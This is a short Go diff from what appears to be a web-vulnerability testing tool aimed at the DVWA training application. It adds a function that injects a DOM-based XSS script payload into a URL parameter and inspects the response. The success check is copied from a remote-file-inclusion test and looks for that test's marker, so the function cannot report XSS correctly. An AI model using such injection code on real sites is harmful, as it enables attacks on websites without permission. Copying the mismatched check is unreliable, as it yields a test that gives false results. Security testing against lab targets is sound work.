@@ -191,3 +191,32 @@ func rfi(site string, path string, client *http.Client) {
 	}
 
 }
+
+func xss_dom(site string, path string, client *http.Client) {
+	defer wg.Done()
+
+	final := site + path + "?default=<script>window.open('https://www.google.com','_self')</script>"
+
+	resp, err := client.Get(final)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	defer resp.Body.Close()
+
+	data, err := ioutil.ReadAll(resp.Body)
+
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	fmt.Println(string(data))
+
+	if strings.Contains(string(data), "This file isn't listed at all on DVWA. If you are reading this, you did something right ;-)") {
+		fmt.Println("Remote File Inclusion Success")
+	} else {
+		fmt.Println("Remote File Inclusion Failed")
+
+	}
+
+}
